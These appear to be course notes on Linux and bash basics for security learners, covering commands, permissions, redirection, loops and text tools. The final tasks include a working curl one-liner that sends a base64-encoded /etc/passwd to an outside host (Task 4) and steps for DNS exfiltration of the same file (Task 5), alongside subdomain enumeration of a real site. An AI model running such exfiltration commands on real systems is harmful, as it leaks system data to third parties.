# Linux

## Why?

- To discover vulnerabilities
- To exploit vulnerabilities
- To privilege escalation ( job interview)

## Linux

- Linux is an operating system
- Open source and community-developed
- For computers, servers, mobile devices

## SHELL

- a command-line interpreter
    - **Interpret**: human language into machine language
1. **bash**
2. **sh**
3. **zsh**

### bash profile

- Custom configurations

### PATH

- Directories of executable programs

![Untitled Diagram.drawio1212.png](/images/Untitled%20Diagram.drawio1212.png)

## Package Manager

- APT, used in Debian-based distribution like Ubuntu
- YUM, used in Red Hat-based distribution, CentOS and Fedora
- Pacman, used in Arch Linux and its derivatives
- Can be **command-line interfaces** (cli) or **graphical user interfaces** (gui)
- **Linux distribution**: customized versions Linux operating system

## Basic Commands

- **`ls`**: Lists files and directories in the current directory
- **`cd`**: Changes the current directory
- **`pwd`**: Prints the current working directory
- **`mkdir`**: Creates a new directory
- **`rm`**: Removes files or directories (e.g., `rm -r` deletes a directory and its contents recursively)
- **`cp`**: Copies files or directories
- **`mv`**: Moves or renames files or directories
- **`cat`**: Displays the content of a file
- **`echo`**: Prints a message or the value of an environment variable to the terminal (e.g., `echo $SHELL` to display the current shell in use)
- **`wget`**: Downloads files from the web
- **`id`**: Displays user and group IDs
- **`whoami`**: Shows the current logged-in username
- **`uname`**: Displays system information (e.g., `uname -a` shows all details including kernel name, version, and system architecture)
- **`ps`**: Shows running processes
- **`du`**: Displays disk usage of files and directories
- **`su`**: Switches to another user (often root)

## Directories

- Hierarchical Structure (starting from `/`)
    - **`/bin`**: Contains essential binary executable files
    - **`/etc`**: Contains system configuration files
    - **`/home`**: Contains users’ personal files and settings.
    - **`/root`**: The home directory of the root user (superuser)
    - **`/var`**: Holds variable data like logs, databases, etc
    - **`/tmp`**: A directory for storing files temporarily

## Important System Files

- **`/etc/passwd`**: Contains user account information
    - Used in Reports
    - Nobody Readable
- **`/etc/shadow`**: Stores encrypted passwords for user accounts
- **`/etc/group`**: Holds information about user groups
- **`/etc/hosts`**: Maps IP addresses to hostnames
- **`/etc/resolv.conf`**: DNS servers used for name resolution
- **`/home/user/.ssh/`**: Contains sensitive SSH files for the user

## Permissions

1. **Read**
2. **Write**
3. **Execute**

## Identities are divided into three categories:

- **User (Owner)**: The user who owns the file or directory
- **Group**: A collection of users who share common access rights
- **Others**: Everyone else (not user or group category)

### Files and Directories Permissions

- **Read (r)**: Allows the user to view the content of a file or list the files in a directory
- **Write (w)**: Allows the user to modify the content of a file or create/delete files in a directory
- **Execute (x)**: Allows the user to execute a file or access (enter) a directory

![Untitled Diagram.drawio121212.png](/images/Untitled%20Diagram.drawio121212.png)

### User is **authorized** or not

- **authorization**: access control, rights of the user

## Sudo

- Superuser Do
- execute commands as the root
- the user should be sudoers

```bash
sudo adduser mamad
```

## SSH

- cryptographic network protocol
- to reach remote shell
- is requires authentication
    - **authentication**: verifying the identity of a user

```bash
ssh user@ip # IP/TCP/SSH
```

## I/O Streams (Input/Output Streams)

### 1. **stdin**

- Used to read input from the user or a file
- File descriptor: **0**

### 2. **stdout**

- Used to display normal output to the terminal
- File descriptor: **1**

### 3. **stderr**

- Used to display error messages to the terminal
- File descriptor: **2**

## Output Redirection Operators

### 1. **`>`**

- Redirects standard output (**stdout**) to a file, overwriting the file if it exists

```bash
id > output  # Redirects stdout to 'output' file
```

### 2. **`2>`**

- Redirects standard error (**stderr**) to a file

```bash
id 2> output  # Redirects stderr to 'output' file
```

### 3. **`2>&1`**

- Redirects **stderr** to the same destination as **stdout** (combines them)

```bash
id 2>&1  # Redirects stderr to wherever stdout is going
```

### 4. **`&>`**

- Redirects both **stdout** and **stderr** to a file (shorthand for `> file 2>&1`)

```bash
id &> output  # Redirects both stdout and stderr to 'output' file
```

### 5. **`&> /dev/null`**

- Redirects both **stdout** and **stderr** to `/dev/null` (discards all output)

```bash
id &> /dev/null  # Suppresses all output (stdout and stderr)
```

## Input Redirection Operators

### 1. **`<`**

- Redirects **stdin** from a file

```bash
cat < input.txt  # Reads input from 'input.txt'
```

### 2. **`>>`**

- Appends standard output (**stdout**) to a file without overwriting existing content

```bash
echo "new line" >> output.txt  # Appends 'new line' to 'output.txt'
```

## Pipe Operator

### 1. **`|`**

- Passes the output of one command as input to another command

```bash
id | base64  # Uses output of 'id' as input for 'base64'
```

## Background Processes

### 1. **`command &`**

- Runs a command in the background, allowing the shell to accept other commands while the process continues

```bash
sleep 10 &  # Runs 'sleep' command in the background
```

---

## Command Separators

### 1. **`;`**

- Allows multiple commands to run in sequence, regardless of success or failure

```bash
id ; whoami  # Executes 'id' and then 'whoami'
```

---

## Logical Operators

### 1. **`&&`**

- Runs the second command only if the first command succeeds

```bash
id && whoami  # Runs 'whoami' only if 'id' succeeds
```

### 2. **`||`**

- Runs the second command only if the first command fails

```bash
id || echo "id failed"  # Displays error message only if 'id' fails
```

---

## **IF**

### 1. **Basic IF**

```bash
number=10

if [ $number -gt 5 ]; then
    echo "The number is greater than 5."
else
    echo "The number is not greater than 5."
fi
```

### 2. **IF (One Line)**

```bash
if [ condition ]; then command; else command; fi
```

---

## **LOOP**

### 1. **While**

- **`(( … ))`**: Allows for performing mathematical calculations

```bash
count=1

while [ $count -le 5 ]
do
    echo "The value: $count"
    ((count++))
done
```

### 2. **While (One Line)**

- Accepts **stdin** input.

```bash
echo "Hello" | while read file; do echo $file; done

ls | while read AAA; do md5sum AAA; done
```

### 3. **For**

```bash
fruits=("apple" "banana" "orange")

for fruit in "${fruits[@]}"
do
    echo "Current fruit: $fruit"
done
```

### 4. **For (One Line)**

```bash
for x in $(ls); do echo "$x"; done
```

---

## **Command Substitution**

- Executes a command within a **subshell** and captures its output.

### 1. **$(command)**

```bash
for domain in **$(subfinder -d aparat.com -silent)**; do echo $domain
```

### 2. `command`

```bash
for domain in **`subfinder -d aparat.com -silent`**; do echo $domain
```

---

## Advanced Commands

### **1. `tee`**

- Copy stdout to a file and to the screen
- **Options**:
    - `-a` : Appends the output to the file instead of overwriting it

```bash
ls | tee -a output | md5sum
```

### **2. `head`**

- To display the first few lines
- **Options**:
    - `-n` : Specifies the number of lines to display

```bash
head /etc/passwd
cat /etc/passwd | head -n 1
```

### **3. `tail`**

- To display the last few lines
- **Options**:
    - `-n` : Specifies the number of lines to display

```bash
tail /etc/passwd
cat /etc/passwd | tail -n 1
```

### **4. `grep`**

- Search for patterns in files or stdin
- **Options**:
    - `-i` : Case-insensitive search
    - `-v` : Invert the match, showing lines that do not contain the pattern
    - Supports regular expressions (regex)

```bash
grep -i root /etc/passwd
cat /etc/passwd | grep root
```

- **Pattern Matching (Regex)**:

```bash
grep "^root" /etc/passwd
```

### **5. `sed`**

- Edits the input stream according to the specified pattern. It can use different delimiters, such as `/`, `|`, etc
- **Options**:
    - `g`: Global mode, meaning all matches in the line will be replaced

```bash
echo aamad | sed 's|a|m|g'
cat /etc/passwd | grep "^root" | sed 's/Administrator/Mammad/'
```

- **Pattern Matching (Regex)**:

```bash
echo m1a2m3a4d | sed 's/[0-9]//g'
```

### **6. `find`**

- List files recursively and apply filters
- **Usage with `wc -l`**: Counts the number of lines (useful for counting files found)

```bash
find /etc/ -name "passwd"
find . -name "*.txt" | wc -l
find . -name "*.txt" | tail -n 1
```

### **7. `cut`**

- To extract specific sections
- **Options**:
    - `-d` : Specifies the delimiter
    - `-f` : Specifies which field(s) to extract

```bash
echo m.mamad.d | cut -d . -f2
```

### **8. `xargs`**

- run a command using each line from stdin as an argument
- **Options**:
    - `-I` : Replaces occurrences of a specified string (e.g., `XX`) with the current line from input

```bash
seq 1 5 | xargs -I XX bash -c "echo -n XX | md5sum"
find . -name "*.txt" | xargs rm
```

### 9. `jq`

- Is a **parser** and command-line tool for processing and filtering JSON data, allowing you to interpret, search, and format the data
- **Options:**
    - `-r` : Outputs raw data (without quotes or JSON formatting)

```bash
echo '{"name": "Navid"}' | jq -r '.name'
```

### 10. `od`

- Used to output content in various formats(hexadecimal)
- **Options:**
    - `-An` : suppresses the output of line numbers
    - `-tx1` ****: outputs the data in hexadecimal format, one byte per byte

```bash
echo "Hello" | od -An -tx1
```

---

## Tasks

### 1. Stdin | Stdout

- Read `passwd` file content with `cat`
    1. Use `xargs` to `md5` each line
    
    ```bash
    cat /etc/passwd | xargs -I BB bash -c "echo -n YY | md5sum"
    ```
    
    1. Use `while` to `base64` each line
    
    ```bash
    cat /etc/passwd | while read line; do echo -n $line | base64; done
    ```
    
    1. Use `while` and `grep` to show only user’s **without** bash access
    
    ```bash
    cat /etc/passwd | while read line; do echo $line | grep -v bash; done
    ```
    

### **2. Sed command**

- Copy the passwd file, remove your username from the copy file by sed command

```bash
cp /etc/passwd .; cat passwd | sed 's/root//g'
```

### **3. JSON Object**

- Download all files in https://wordlists.assetnote.io/data/automated.json by a one liner bash script

```bash
curl -s https://wordlists.assetnote.io/data/automated.json | jq -r '.[][].Filename' | while read line; do wget https://wordlists-cdn.assetnote.io/data/automated/$line; done

curl -s https://wordlists.assetnote.io/data/automated.json | jq -r '.[][].Filename' | xargs -I XX bash -c "wget https://wordlists-cdn.assetnote.io/./data/automated/XX"
```

### **4. HTTP Data Exfiltration**

- read the passwd file content, make it base64, then send it to [icollab.info](http://icollab.info/) by cURL command

```bash
curl https://icollab.info -d "content=$(cat /etc/passwd | base64)"
```

### **5. DNS Data Exfiltration**

Send `passwd` file content by DNS to `icollab.info`, steps:

- `cat` the `passwd` file
- make the output `HEX` with `od`
- Remove the spaces by `sed`
- Use while to use `ping` or `dig` command for each line